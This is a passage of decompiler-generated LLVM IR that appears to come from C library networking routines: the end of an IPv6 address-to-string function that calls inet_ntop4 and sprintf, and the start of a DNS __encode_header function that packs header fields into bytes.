  %v1_804d585 = icmp eq i1 %v10_804d593, false
  br i1 %v1_804d585, label %dec_label_pc_804d590, label %dec_label_pc_804d587

dec_label_pc_804d587:                             ; preds = %dec_label_pc_804d582
  store i32 %v0_804d5a872, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d5a8

dec_label_pc_804d590:                             ; preds = %dec_label_pc_804d582
  %v0_804d590 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d590 = add i32 %v0_804d590, 1
  store i32 %v1_804d590, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d5a8

dec_label_pc_804d593:                             ; preds = %dec_label_pc_804d57b
  br i1 %v10_804d593, label %dec_label_pc_804d5a8, label %dec_label_pc_804d598

dec_label_pc_804d598:                             ; preds = %dec_label_pc_804d593
  %v10_804d598 = icmp eq i32 %v0_804d5b370, -1
  %v0_804d5a1.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d59d = load i32, i32* @ebp, align 4
  %v7_804d59f = icmp sgt i32 %v0_804d5a1.pre, %v1_804d59d
  %or.cond = or i1 %v10_804d598, %v7_804d59f
  br i1 %or.cond, label %dec_label_pc_804d5a1, label %dec_label_pc_804d5a5

dec_label_pc_804d5a1:                             ; preds = %dec_label_pc_804d598
  store i32 %v0_804d5a1.pre, i32* @ebp, align 4
  store i32 %v0_804d5be69, i32* @edi, align 4
  br label %dec_label_pc_804d5a5

dec_label_pc_804d5a5:                             ; preds = %dec_label_pc_804d598, %dec_label_pc_804d5a1
  %v0_804d59812 = phi i32 [ %v0_804d5be69, %dec_label_pc_804d5a1 ], [ %v0_804d5b370, %dec_label_pc_804d598 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d5a8

dec_label_pc_804d5a8:                             ; preds = %dec_label_pc_804d593, %dec_label_pc_804d590, %dec_label_pc_804d587, %dec_label_pc_804d5a5
  %v0_804d5a314 = phi i32 [ %v0_804d5be69, %dec_label_pc_804d593 ], [ %v0_804d5be69, %dec_label_pc_804d590 ], [ %v0_804d5a872, %dec_label_pc_804d587 ], [ -1, %dec_label_pc_804d5a5 ]
  %v0_804d5939 = phi i32 [ -1, %dec_label_pc_804d593 ], [ %v0_804d59371, %dec_label_pc_804d590 ], [ %v0_804d5a872, %dec_label_pc_804d587 ], [ -1, %dec_label_pc_804d5a5 ]
  %v0_804d59810 = phi i32 [ %v0_804d5b370, %dec_label_pc_804d593 ], [ %v0_804d5b370, %dec_label_pc_804d590 ], [ %v0_804d5b370, %dec_label_pc_804d587 ], [ %v0_804d59812, %dec_label_pc_804d5a5 ]
  %v1_804d5a8 = add nuw nsw i32 %v0_804d5a872, 1
  store i32 %v1_804d5a8, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_804d5a8, 8
  br i1 %exitcond, label %dec_label_pc_804d5ae, label %dec_label_pc_804d57b

dec_label_pc_804d5ae:                             ; preds = %dec_label_pc_804d5a8
  %v10_804d5ae = icmp eq i32 %v0_804d5a314, -1
  br i1 %v10_804d5ae, label %dec_label_pc_804d5c0, label %dec_label_pc_804d5b3

dec_label_pc_804d5b3:                             ; preds = %dec_label_pc_804d5ae
  %v10_804d5b3 = icmp eq i32 %v0_804d59810, -1
  %v0_804d5bc.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_804d5b3, label %dec_label_pc_804d5bc, label %dec_label_pc_804d5b8

dec_label_pc_804d5b8:                             ; preds = %dec_label_pc_804d5b3
  %v1_804d5b8 = load i32, i32* @ebp, align 4
  %v7_804d5ba = icmp sgt i32 %v0_804d5bc.pre, %v1_804d5b8
  br i1 %v7_804d5ba, label %dec_label_pc_804d5bc, label %dec_label_pc_804d5c0.thread

dec_label_pc_804d5c0.thread:                      ; preds = %dec_label_pc_804d5b8
  br label %dec_label_pc_804d5c5

dec_label_pc_804d5bc:                             ; preds = %dec_label_pc_804d5b3, %dec_label_pc_804d5b8
  store i32 %v0_804d5bc.pre, i32* @ebp, align 4
  store i32 %v0_804d5a314, i32* @edi, align 4
  br label %dec_label_pc_804d5c0

dec_label_pc_804d5c0:                             ; preds = %dec_label_pc_804d5ae, %dec_label_pc_804d5bc
  %v0_804d5c0 = phi i32 [ %v0_804d59810, %dec_label_pc_804d5ae ], [ %v0_804d5a314, %dec_label_pc_804d5bc ]
  %v10_804d5c0 = icmp eq i32 %v0_804d5c0, -1
  br i1 %v10_804d5c0, label %dec_label_pc_804d5cd, label %dec_label_pc_804d5c0.dec_label_pc_804d5c5_crit_edge

dec_label_pc_804d5c0.dec_label_pc_804d5c5_crit_edge: ; preds = %dec_label_pc_804d5c0
  %v0_804d5c5.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804d5c5

dec_label_pc_804d5c5:                             ; preds = %dec_label_pc_804d5c0.dec_label_pc_804d5c5_crit_edge, %dec_label_pc_804d5c0.thread
  %v0_804d5c5 = phi i32 [ %v1_804d5b8, %dec_label_pc_804d5c0.thread ], [ %v0_804d5c5.pre, %dec_label_pc_804d5c0.dec_label_pc_804d5c5_crit_edge ]
  %v0_804d5c050 = phi i32 [ %v0_804d59810, %dec_label_pc_804d5c0.thread ], [ %v0_804d5c0, %dec_label_pc_804d5c0.dec_label_pc_804d5c5_crit_edge ]
  %v1_804d5c5 = add i32 %v0_804d5c5, -1
  %v6_804d5c5 = sub i32 0, %v0_804d5c5
  %v7_804d5c5 = and i32 %v0_804d5c5, %v6_804d5c5
  %v8_804d5c5 = icmp slt i32 %v7_804d5c5, 0
  %v9_804d5c5 = icmp eq i32 %v1_804d5c5, 0
  %v10_804d5c5 = icmp slt i32 %v1_804d5c5, 0
  %v3_804d5c8 = icmp eq i1 %v10_804d5c5, %v8_804d5c5
  %v4_804d5c8 = icmp eq i1 %v9_804d5c5, false
  %v5_804d5c8 = and i1 %v4_804d5c8, %v3_804d5c8
  br i1 %v5_804d5c8, label %dec_label_pc_804d5cd, label %dec_label_pc_804d5ca

dec_label_pc_804d5ca:                             ; preds = %dec_label_pc_804d5c5
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804d5cd

dec_label_pc_804d5cd:                             ; preds = %dec_label_pc_804d5c5, %dec_label_pc_804d5c0, %dec_label_pc_804d5ca
  %v0_804d66d19 = phi i32 [ %v0_804d5c050, %dec_label_pc_804d5c5 ], [ -1, %dec_label_pc_804d5c0 ], [ -1, %dec_label_pc_804d5ca ]
  %v2_804d5cd = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_804d5cd, i32* @ebx, align 4
  %v3_804d64f = add i32 %v4_804d52f, 64
  %v12_804d60d = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_804d66d62 = icmp eq i32 %v0_804d66d19, -1
  %v1_804d615 = icmp eq i1 %v12_804d60d, false
  br label %dec_label_pc_804d5d8

dec_label_pc_804d5d8:                             ; preds = %dec_label_pc_804d5cd, %dec_label_pc_804d663
  %v10_804d66d68 = phi i1 [ %v10_804d66d62, %dec_label_pc_804d5cd ], [ %v10_804d66d, %dec_label_pc_804d663 ]
  %v0_804d5f267 = phi i32 [ 0, %dec_label_pc_804d5cd ], [ %v1_804d663, %dec_label_pc_804d663 ]
  %v1_804d5e866 = phi i32 [ %v0_804d66d19, %dec_label_pc_804d5cd ], [ %v0_804d66d.pre, %dec_label_pc_804d663 ]
  %v0_804d5f665 = phi i32 [ %v2_804d5cd, %dec_label_pc_804d5cd ], [ %v0_804d5ec20, %dec_label_pc_804d663 ]
  %stack_var_-120.164 = phi i8* [ null, %dec_label_pc_804d5cd ], [ %stack_var_-120.0, %dec_label_pc_804d663 ]
  %stack_var_-116.163 = phi i32 [ 32, %dec_label_pc_804d5cd ], [ %stack_var_-116.0, %dec_label_pc_804d663 ]
  br i1 %v10_804d66d68, label %dec_label_pc_804d5f2, label %dec_label_pc_804d5dd

dec_label_pc_804d5dd:                             ; preds = %dec_label_pc_804d5d8
  %v12_804d5dd = icmp eq i32 %v0_804d5f267, %v1_804d5e866
  %v5_804d5df = icmp slt i32 %v0_804d5f267, %v1_804d5e866
  br i1 %v5_804d5df, label %dec_label_pc_804d5f2, label %dec_label_pc_804d5e1

dec_label_pc_804d5e1:                             ; preds = %dec_label_pc_804d5dd
  %v1_804d5e1 = load i32, i32* @ebp, align 4
  %v2_804d5e1 = add i32 %v1_804d5e1, %v1_804d5e866
  store i32 %v2_804d5e1, i32* %eax.global-to-local, align 4
  %v5_804d5e6 = icmp slt i32 %v0_804d5f267, %v2_804d5e1
  br i1 %v5_804d5e6, label %dec_label_pc_804d5e8, label %dec_label_pc_804d5f2

dec_label_pc_804d5e8:                             ; preds = %dec_label_pc_804d5e1
  %v1_804d5ea = icmp eq i1 %v12_804d5dd, false
  br i1 %v1_804d5ea, label %dec_label_pc_804d663, label %dec_label_pc_804d5ec

dec_label_pc_804d5ec:                             ; preds = %dec_label_pc_804d5e8
  %v1_804d5ec = inttoptr i32 %v0_804d5f665 to i8*
  store i8 58, i8* %v1_804d5ec, align 1
  %v0_804d5ef = load i32, i32* @ebx, align 4
  %v1_804d5ef = add i32 %v0_804d5ef, 1
  store i32 %v1_804d5ef, i32* @ebx, align 4
  br label %dec_label_pc_804d663

dec_label_pc_804d5f2:                             ; preds = %dec_label_pc_804d5e1, %dec_label_pc_804d5dd, %dec_label_pc_804d5d8
  %v1_804d5f2 = icmp eq i32 %v0_804d5f267, 0
  br i1 %v1_804d5f2, label %dec_label_pc_804d5fa.thread, label %dec_label_pc_804d5fa

dec_label_pc_804d5fa.thread:                      ; preds = %dec_label_pc_804d5f2
  br label %dec_label_pc_804d64e

dec_label_pc_804d5fa:                             ; preds = %dec_label_pc_804d5f2
  %v1_804d5f6 = inttoptr i32 %v0_804d5f665 to i8*
  store i8 58, i8* %v1_804d5f6, align 1
  %v0_804d5f9 = load i32, i32* @ebx, align 4
  %v1_804d5f9 = add i32 %v0_804d5f9, 1
  store i32 %v1_804d5f9, i32* @ebx, align 4
  %v0_804d5fa.pre = load i32, i32* @esi, align 4
  %v9_804d5fa = icmp eq i32 %v0_804d5fa.pre, 6
  %v1_804d5fd = icmp eq i1 %v9_804d5fa, false
  br i1 %v1_804d5fd, label %dec_label_pc_804d64e, label %dec_label_pc_804d5ff

dec_label_pc_804d5ff:                             ; preds = %dec_label_pc_804d5fa
  %v0_804d5ff = load i32, i32* @edi, align 4
  %v1_804d5ff = icmp eq i32 %v0_804d5ff, 0
  %v1_804d601 = icmp eq i1 %v1_804d5ff, false
  br i1 %v1_804d601, label %dec_label_pc_804d64e, label %dec_label_pc_804d603

dec_label_pc_804d603:                             ; preds = %dec_label_pc_804d5ff
  %v0_804d603 = load i32, i32* @ebp, align 4
  %v9_804d603 = icmp eq i32 %v0_804d603, 6
  br i1 %v9_804d603, label %dec_label_pc_804d617, label %dec_label_pc_804d608

dec_label_pc_804d608:                             ; preds = %dec_label_pc_804d603
  %v9_804d608 = icmp eq i32 %v0_804d603, 5
  %v1_804d60b = icmp eq i1 %v9_804d608, false
  br i1 %v1_804d60b, label %dec_label_pc_804d64e, label %dec_label_pc_804d60d

dec_label_pc_804d60d:                             ; preds = %dec_label_pc_804d608
  br i1 %v1_804d615, label %dec_label_pc_804d64e, label %dec_label_pc_804d617

dec_label_pc_804d617:                             ; preds = %dec_label_pc_804d60d, %dec_label_pc_804d603
  %v2_804d61d = sub i32 %v1_804d5f9, %v2_804d5cd
  store i32 %v2_804d61d, i32* @esi, align 4
  %v2_804d628 = sub i32 46, %v2_804d61d
  store i32 %v2_804d628, i32* @ecx, align 4
  %v1_804d62a = add i32 %arg2, 12
  store i32 %v1_804d62a, i32* @eax, align 4
  store i32 %v1_804d5f9, i32* @edx, align 4
  %v0_804d62f = load i8*, i8** %stack_var_-124, align 4
  %v1_804d62f = ptrtoint i8* %v0_804d62f to i32
  %v3_804d62f = ptrtoint i8* %stack_var_-120.164 to i32
  %v5_804d62f = call i32 @inet_ntop4(i32 %v1_804d62f, i32 %v3_804d62f, i32 %stack_var_-116.163)
  store i32 %v5_804d62f, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_804d636 = icmp eq i32 %v5_804d62f, 0
  br i1 %v1_804d636, label %dec_label_pc_804d6c0, label %dec_label_pc_804d63e

dec_label_pc_804d63e:                             ; preds = %dec_label_pc_804d617
  %v0_804d641 = load i32, i32* @ebx, align 4
  %v5_804d641 = inttoptr i32 %v0_804d641 to i8*
  store i8* %v5_804d641, i8** %stack_var_-124, align 4
  %v3_804d642 = call i32 @strlen(i8* %v5_804d641)
  store i32 %v3_804d642, i32* %eax.global-to-local, align 4
  %v0_804d64a = load i32, i32* @ebx, align 4
  %v3_804d64a = add i32 %v0_804d64a, %v3_804d642
  store i32 %v3_804d64a, i32* @ebx, align 4
  %v0_804d672.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d672

dec_label_pc_804d64e:                             ; preds = %dec_label_pc_804d5fa.thread, %dec_label_pc_804d5fa, %dec_label_pc_804d60d, %dec_label_pc_804d608, %dec_label_pc_804d5ff
  %v1_804d64f55 = phi i32 [ 0, %dec_label_pc_804d5fa.thread ], [ %v0_804d5fa.pre, %dec_label_pc_804d5fa ], [ %v0_804d5fa.pre, %dec_label_pc_804d60d ], [ %v0_804d5fa.pre, %dec_label_pc_804d608 ], [ %v0_804d5fa.pre, %dec_label_pc_804d5ff ]
  %v0_804d65854 = phi i32 [ %v0_804d5f665, %dec_label_pc_804d5fa.thread ], [ %v1_804d5f9, %dec_label_pc_804d5fa ], [ %v1_804d5f9, %dec_label_pc_804d60d ], [ %v1_804d5f9, %dec_label_pc_804d608 ], [ %v1_804d5f9, %dec_label_pc_804d5ff ]
  %v0_804d64e = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804d64e, i32* %stack_var_-112, align 4
  %v2_804d64f = mul i32 %v1_804d64f55, 4
  %v4_804d64f = add i32 %v3_804d64f, %v2_804d64f
  %v5_804d64f = inttoptr i32 %v4_804d64f to i32*
  %v6_804d64f = load i32, i32* %v5_804d64f, align 4
  %v5_804d658 = inttoptr i32 %v0_804d65854 to i8*
  store i8* %v5_804d658, i8** %stack_var_-124, align 4
  %v6_804d659 = call i32 @sprintf(i32 %v0_804d65854, i32 ptrtoint ([3 x i8]* @global_var_8050639.109 to i32), i32 %v6_804d64f, i32 %v0_804d64e)
  store i32 %v6_804d659, i32* %eax.global-to-local, align 4
  %v0_804d661 = load i32, i32* @ebx, align 4
  %v2_804d661 = add i32 %v0_804d661, %v6_804d659
  store i32 %v2_804d661, i32* @ebx, align 4
  br label %dec_label_pc_804d663

dec_label_pc_804d663:                             ; preds = %dec_label_pc_804d5e8, %dec_label_pc_804d5ec, %dec_label_pc_804d64e
  %stack_var_-116.0 = phi i32 [ %v6_804d64f, %dec_label_pc_804d64e ], [ %stack_var_-116.163, %dec_label_pc_804d5e8 ], [ %stack_var_-116.163, %dec_label_pc_804d5ec ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050639.109, i32 0, i32 0), %dec_label_pc_804d64e ], [ %stack_var_-120.164, %dec_label_pc_804d5e8 ], [ %stack_var_-120.164, %dec_label_pc_804d5ec ]
  %v0_804d5ec20 = phi i32 [ %v2_804d661, %dec_label_pc_804d64e ], [ %v0_804d5f665, %dec_label_pc_804d5e8 ], [ %v1_804d5ef, %dec_label_pc_804d5ec ]
  %v0_804d663 = load i32, i32* @esi, align 4
  %v1_804d663 = add i32 %v0_804d663, 1
  %v0_804d66d.pre = load i32, i32* @edi, align 4
  store i32 %v1_804d663, i32* @esi, align 4
  %v7_804d667 = icmp sgt i32 %v1_804d663, 7
  %v10_804d66d = icmp eq i32 %v0_804d66d.pre, -1
  br i1 %v7_804d667, label %dec_label_pc_804d66d, label %dec_label_pc_804d5d8

dec_label_pc_804d66d:                             ; preds = %dec_label_pc_804d663
  br i1 %v10_804d66d, label %dec_label_pc_804d67e, label %dec_label_pc_804d672

dec_label_pc_804d672:                             ; preds = %dec_label_pc_804d66d, %dec_label_pc_804d63e
  %v0_804d67a = phi i32 [ %v0_804d5ec20, %dec_label_pc_804d66d ], [ %v3_804d64a, %dec_label_pc_804d63e ]
  %v0_804d672 = phi i32 [ %v0_804d66d.pre, %dec_label_pc_804d66d ], [ %v0_804d672.pre, %dec_label_pc_804d63e ]
  %v1_804d672 = load i32, i32* @ebp, align 4
  %v2_804d672 = add i32 %v1_804d672, %v0_804d672
  store i32 %v2_804d672, i32* %eax.global-to-local, align 4
  %v9_804d675 = icmp eq i32 %v2_804d672, 8
  %v1_804d678 = icmp eq i1 %v9_804d675, false
  br i1 %v1_804d678, label %dec_label_pc_804d67e, label %dec_label_pc_804d67a

dec_label_pc_804d67a:                             ; preds = %dec_label_pc_804d672
  %v1_804d67a = inttoptr i32 %v0_804d67a to i8*
  store i8 58, i8* %v1_804d67a, align 1
  %v0_804d67d = load i32, i32* @ebx, align 4
  %v1_804d67d = add i32 %v0_804d67d, 1
  store i32 %v1_804d67d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d67e

dec_label_pc_804d67e:                             ; preds = %dec_label_pc_804d672, %dec_label_pc_804d66d, %dec_label_pc_804d67a
  %v0_804d682 = phi i32 [ %v0_804d67a, %dec_label_pc_804d672 ], [ %v0_804d5ec20, %dec_label_pc_804d66d ], [ %v1_804d67d, %dec_label_pc_804d67a ]
  store i32 %v2_804d5cd, i32* %edx.global-to-local, align 4
  %v1_804d682 = add i32 %v0_804d682, 1
  store i32 %v1_804d682, i32* %eax.global-to-local, align 4
  %v1_804d685 = inttoptr i32 %v0_804d682 to i8*
  store i8 0, i8* %v1_804d685, align 1
  %v0_804d688 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d688 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d688 = sub i32 %v0_804d688, %v1_804d688
  store i32 %v2_804d688, i32* @eax, align 4
  %tmp79 = icmp ugt i32 %v2_804d688, %arg4
  br i1 %tmp79, label %dec_label_pc_804d690, label %dec_label_pc_804d69d

dec_label_pc_804d690:                             ; preds = %dec_label_pc_804d67e
  %v0_804d690 = load i8*, i8** %stack_var_-124, align 4
  %v1_804d690 = ptrtoint i8* %v0_804d690 to i32
  %v2_804d690 = call i32 @__errno_location(i32 %v1_804d690)
  store i32 %v2_804d690, i32* %eax.global-to-local, align 4
  %v1_804d695 = inttoptr i32 %v2_804d690 to i32*
  store i32 28, i32* %v1_804d695, align 4
  br label %dec_label_pc_804d6be

dec_label_pc_804d69d:                             ; preds = %dec_label_pc_804d67e
  %v0_804d69d = load i32, i32* @edi, align 4
  store i32 %v0_804d69d, i32* %stack_var_-112, align 4
  %tmp46 = bitcast i8** %stack_var_12 to i32*
  %v3_804d6a03 = load i32, i32* %tmp46, align 4
  %tmp47 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_804d6a03, i32* %tmp47, align 4
  %v0_804d6a7.cast = inttoptr i32 %v3_804d6a03 to i8*
  %v5_804d6a7 = call i32 @strcpy(i8* %v0_804d6a7.cast, i32 %v2_804d5cd)
  store i32 %v5_804d6a7, i32* %eax.global-to-local, align 4
  store i32 %v5_804d6a7, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d6c0

dec_label_pc_804d6b3:                             ; preds = %dec_label_pc_804d50c
  %v1_804d6b3 = call i32 @__errno_location(i32 %v0_804d4ff)
  store i32 %v1_804d6b3, i32* %eax.global-to-local, align 4
  %v1_804d6b8 = inttoptr i32 %v1_804d6b3 to i32*
  store i32 97, i32* %v1_804d6b8, align 4
  br label %dec_label_pc_804d6be

dec_label_pc_804d6be:                             ; preds = %dec_label_pc_804d690, %dec_label_pc_804d6b3
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d6c0

dec_label_pc_804d6c0:                             ; preds = %dec_label_pc_804d617, %dec_label_pc_804d517, %dec_label_pc_804d69d, %dec_label_pc_804d6be
  %v0_804d6c3 = phi i32 [ 0, %dec_label_pc_804d617 ], [ %v3_804d523, %dec_label_pc_804d517 ], [ %v5_804d6a7, %dec_label_pc_804d69d ], [ 0, %dec_label_pc_804d6be ]
  store i32 %v0_804d6c3, i32* %eax.global-to-local, align 4
  store i32 %v0_804d4ff, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804d6c3

; uselistorder directives
  uselistorder i32 %v0_804d6c3, { 1, 0 }
  uselistorder i32 %v0_804d682, { 1, 0 }
  uselistorder i32 %v1_804d663, { 1, 0, 2 }
  uselistorder i32 %v0_804d65854, { 1, 0 }
  uselistorder i32 %v0_804d5fa.pre, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804d5f9, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %stack_var_-116.163, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.164, { 2, 1, 0 }
  uselistorder i32 %v0_804d5f665, { 2, 3, 1, 0 }
  uselistorder i32 %v1_804d5e866, { 2, 0, 1 }
  uselistorder i32 %v0_804d5f267, { 2, 1, 0, 3 }
  uselistorder i32 %v2_804d5cd, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_804d5c5, { 1, 0 }
  uselistorder i32 %v0_804d5c5, { 1, 2, 0 }
  uselistorder i32 %v1_804d5a8, { 0, 2, 1 }
  uselistorder i32 %v0_804d59810, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804d5a314, { 0, 2, 1, 3 }
  uselistorder i1 %v10_804d593, { 1, 0 }
  uselistorder i32 %v0_804d5be69, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804d5b370, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_804d5a872, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_804d56373, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_804d4ff, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 8, 9, 0, 1, 2, 3, 4 }
  uselistorder i32* %ebx.global-to-local, { 6, 7, 4, 2, 0, 3, 1, 5 }
  uselistorder i32* %eax.global-to-local, { 11, 12, 13, 16, 14, 15, 17, 19, 18, 20, 21, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 97, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*, i32)* @strcpy, { 3, 0, 1, 2 }
  uselistorder [3 x i8]* @global_var_8050639.109, { 1, 0 }
  uselistorder i8 58, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 15, { 0, 4, 5, 1, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804d6c0, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804d6be, { 1, 0 }
  uselistorder label %dec_label_pc_804d67e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d663, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d64e, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_804d5d8, { 1, 0 }
  uselistorder label %dec_label_pc_804d5cd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d5c0, { 1, 0 }
  uselistorder label %dec_label_pc_804d5bc, { 1, 0 }
  uselistorder label %dec_label_pc_804d5a8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d5a5, { 1, 0 }
  uselistorder label %dec_label_pc_804d57b, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i8* @__decompiler_undefined_function_3()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804d6cd = load i32, i32* @ebx, align 4
  store i32 %v0_804d6cd, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* %ebx.global-to-local, align 4
  %v4_804d6d5 = ptrtoint i8* %tmp8 to i32
  store i32 %v4_804d6d5, i32* %esi.global-to-local, align 4
  %v7_804d6de = icmp sgt i32 %tmp, 11
  br i1 %v7_804d6de, label %dec_label_pc_804d6e4, label %dec_label_pc_804d77a

dec_label_pc_804d6e4:                             ; preds = %entry
  %v1_804d6e4 = add i32 %tmp9, 1
  %v2_804d6e4 = inttoptr i32 %v1_804d6e4 to i8*
  %v3_804d6e4 = load i8, i8* %v2_804d6e4, align 1
  store i8 %v3_804d6e4, i8* %tmp8, align 1
  %v0_804d6ea = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d6ea = inttoptr i32 %v0_804d6ea to i32*
  %v2_804d6ea = load i32, i32* %v1_804d6ea, align 4
  %v1_804d6ec = trunc i32 %v2_804d6ea to i8
  %v2_804d6ec = load i32, i32* %esi.global-to-local, align 4
  %v3_804d6ec = add i32 %v2_804d6ec, 1
  %v4_804d6ec = inttoptr i32 %v3_804d6ec to i8*
  store i8 %v1_804d6ec, i8* %v4_804d6ec, align 1
  %v0_804d712 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d712 = add i32 %v0_804d712, 8
  %v2_804d712 = inttoptr i32 %v1_804d712 to i32*
  %v3_804d712 = load i32, i32* %v2_804d712, align 4
  %v1_804d715 = mul i32 %v3_804d712, 8
  %v2_804d71b = or i32 %v1_804d715, 4
  %v1_804d71d = add i32 %v0_804d712, 20
  %v2_804d71d = inttoptr i32 %v1_804d71d to i32*
  %v3_804d71d = load i32, i32* %v2_804d71d, align 4
  %v4_804d71d = icmp eq i32 %v3_804d71d, 0
  %v1_804d721 = icmp eq i1 %v4_804d71d, false
  %v2_804d721 = zext i1 %v1_804d721 to i32
  %v2_804d724 = or i32 %v2_804d721, %v2_804d71b
  %v2_804d726 = or i32 %v2_804d724, -126
  %v5_804d726 = trunc i32 %v2_804d726 to i8
  store i32 %v2_804d726, i32* @ecx, align 4
  %v2_804d728 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d728 = add i32 %v2_804d728, 2
  %v4_804d728 = inttoptr i32 %v3_804d728 to i8*
  store i8 %v5_804d726, i8* %v4_804d728, align 1
  %v0_804d72b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d731 = add i32 %v0_804d72b, 28
  %v2_804d731 = inttoptr i32 %v1_804d731 to i8*
  %v3_804d731 = load i8, i8* %v2_804d731, align 1
  %tmp13 = urem i8 %v3_804d731, 16
  %v2_804d73c = or i8 %tmp13, -128
  %v2_804d73e = load i32, i32* %esi.global-to-local, align 4
  %v3_804d73e = add i32 %v2_804d73e, 3
  %v4_804d73e = inttoptr i32 %v3_804d73e to i8*
  store i8 %v2_804d73c, i8* %v4_804d73e, align 1
  %v0_804d741 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d741 = add i32 %v0_804d741, 33
  %v2_804d741 = inttoptr i32 %v1_804d741 to i8*
  %v3_804d741 = load i8, i8* %v2_804d741, align 1
  %v2_804d745 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d745 = add i32 %v2_804d745, 4
  %v4_804d745 = inttoptr i32 %v3_804d745 to i8*
  store i8 %v3_804d741, i8* %v4_804d745, align 1
  %v0_804d748 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d748 = add i32 %v0_804d748, 32
  %v2_804d748 = inttoptr i32 %v1_804d748 to i32*
  %v3_804d748 = load i32, i32* %v2_804d748, align 4
  %v1_804d74b = trunc i32 %v3_804d748 to i8
  %v2_804d74b = load i32, i32* %esi.global-to-local, align 4
  %v3_804d74b = add i32 %v2_804d74b, 5
  %v4_804d74b = inttoptr i32 %v3_804d74b to i8*
  store i8 %v1_804d74b, i8* %v4_804d74b, align 1
  %v0_804d74e = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d74e = add i32 %v0_804d74e, 37
  %v2_804d74e = inttoptr i32 %v1_804d74e to i8*
  %v3_804d74e = load i8, i8* %v2_804d74e, align 1
  %v2_804d752 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d752 = add i32 %v2_804d752, 6
  %v4_804d752 = inttoptr i32 %v3_804d752 to i8*
  store i8 %v3_804d74e, i8* %v4_804d752, align 1
  %v0_804d755 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d755 = add i32 %v0_804d755, 36
  %v2_804d755 = inttoptr i32 %v1_804d755 to i32*
  %v3_804d755 = load i32, i32* %v2_804d755, align 4
  %v1_804d758 = trunc i32 %v3_804d755 to i8
  %v2_804d758 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d758 = add i32 %v2_804d758, 7
  %v4_804d758 = inttoptr i32 %v3_804d758 to i8*
  store i8 %v1_804d758, i8* %v4_804d758, align 1
  %v0_804d75b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d75b = add i32 %v0_804d75b, 41
  %v2_804d75b = inttoptr i32 %v1_804d75b to i8*
  %v3_804d75b = load i8, i8* %v2_804d75b, align 1
  %v2_804d75f = load i32, i32* %esi.global-to-local, align 4
  %v3_804d75f = add i32 %v2_804d75f, 8
  %v4_804d75f = inttoptr i32 %v3_804d75f to i8*
  store i8 %v3_804d75b, i8* %v4_804d75f, align 1
  %v0_804d762 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d762 = add i32 %v0_804d762, 40
  %v2_804d762 = inttoptr i32 %v1_804d762 to i32*
  %v3_804d762 = load i32, i32* %v2_804d762, align 4
  %v1_804d765 = trunc i32 %v3_804d762 to i8
  %v2_804d765 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d765 = add i32 %v2_804d765, 9
